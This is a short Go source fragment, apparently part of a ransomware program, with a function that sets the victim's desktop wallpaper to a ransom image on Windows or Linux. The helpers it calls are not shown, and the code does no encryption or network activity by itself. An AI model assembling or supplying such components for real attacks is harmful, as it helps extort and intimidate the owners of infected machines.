package notes

import (
	"log"
	"os"
	"path/filepath"
	"runtime"
)

const (
	SPI_SETDESKWALLPAPER = 0x0014
	SPIF_UPDATEINIFILE   = 0x01
	SPIF_SENDCHANGE      = 0x02
)

func ChangeBackgroundImage() {
	currentWorkingDirectory, err := os.Getwd()
	if err != nil {
		log.Println("[-] Error getting current working directory:", err)
		return
	}
	imagePath := filepath.Join(currentWorkingDirectory, ransomDesktopImage)
	// Change desktop background
	switch runtime.GOOS {
	case "windows":
		// imagePath = os.Getwd() + "\\" + RansomDesktopImage
		changeWindowsBackground(imagePath)
	case "linux":
		changeLinuxBackground(imagePath)
	default:
		log.Println("[-] Unsupported OS")
	}
}
